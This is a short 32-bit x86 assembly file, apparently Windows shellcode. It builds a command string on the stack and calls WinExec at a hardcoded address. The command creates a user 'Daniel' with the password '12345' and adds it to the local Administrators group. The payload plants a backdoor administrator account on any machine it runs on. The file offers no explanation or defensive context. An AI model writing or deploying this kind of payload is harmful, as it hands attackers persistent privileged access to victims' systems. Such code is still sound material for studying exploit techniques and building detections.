BITS 32

global _start
Section .text

_start:

XOR EAX,EAX;reset eax
PUSH EAX  ;push eax in to the stack
PUSH "niel";push words in the stack
PUSH "D Da"
PUSH " /AD"
PUSH "tors"
PUSH "stra"
PUSH "mini"
PUSH "p Ad"
PUSH "grou"
PUSH "ocal"
PUSH "et l"
PUSH "&& n"
PUSH "DD  "
PUSH "5 /A"
PUSH "1234"
PUSH "iel "
PUSH " Dan"
PUSH "user"
PUSH "net "
PUSH "/c  "
PUSH "exe "
PUSH "cmd."
MOV EAX,ESP              
PUSH EAX    ;push command in to the stack            
MOV EBX,0x7c863231   ;WinExec to the EBX
CALL EBX 
